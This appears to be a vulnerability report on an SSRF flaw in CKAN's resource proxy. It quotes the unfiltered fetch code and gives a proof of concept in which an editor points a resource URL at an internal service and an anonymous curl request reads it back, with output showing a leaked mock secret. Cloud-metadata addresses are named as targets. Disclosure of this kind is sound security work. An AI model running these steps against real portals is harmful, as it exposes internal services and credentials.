## Description

`proxy_resource` in `ckanext/resourceproxy/blueprint.py` fetches a resource URL server-side with only a scheme/netloc existence check:

```python
parts = urlsplit(url)
if not parts.scheme or not parts.netloc:
    return abort(409, _(u'Invalid URL.'))
...
r = requests.head(url, timeout=timeout, proxies=proxies)   # follows to requests.get(...)
```

There is no host/network-segment allowlist and no rejection of private/loopback/link-local targets (127/8, 10/8, 172.16/12, 192.168/16, 169.254/16). The existing guards (record visibility via `resource_show`, `max_file_size`, timeout, optional `ckan.download_proxy`) do not constrain the fetch **destination**. The docs warn about exposing internal network resources and suggest the optional download proxy, but no destination filtering exists in code.

The proxy endpoint is reachable by anyone who can view the resource (including anonymous users for public datasets), while the resource URL is controlled by dataset editors — on open-registration portals that means any signed-in user.

## Impact

Full (non-blind) SSRF with response exfiltration: an editor points a public dataset's resource URL at an internal address; any anonymous visitor then retrieves the CKAN server's view of `http://169.254.169.254/...`, internal admin panels, or internal APIs through `/dataset/<id>/resource/<rid>/proxy` (up to `ckan.resource_proxy.max_file_size` per request).

## PoC

Verified with a full CKAN stack (ckan-base image whose `resourceproxy/blueprint.py` is line-identical to the 2.13 tree), `ckan.plugins = resource_proxy`, and a mock "internal" HTTP service on an isolated docker network (not published to any host port):

```bash
# editor sets the resource URL to the internal-only service

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)
resource.url = "http://internal-mock:8000/"

# anonymous attacker (no credentials) reads it through the proxy
curl "http://localhost:5000/dataset/ssrf-repro-ds/resource/<resource_id>/proxy"
```

## Execution result

```
=== 1. attacker CANNOT reach internal-mock directly ===
direct access: 000 (000 = unreachable)

=== 2. anonymous request to CKAN resource proxy ===
proxy HTTP 200, 54 bytes

=== 3. leaked content ===
SECRET-INTERNAL-METADATA: admin-password=P@ssw0rd-123

=== container log ===
INFO [ckanext.resourceproxy.blueprint] Proxify resource <resource_id>
```

The anonymous request returned the internal-only service's body verbatim; the same target is unreachable directly from the attacker's network position.
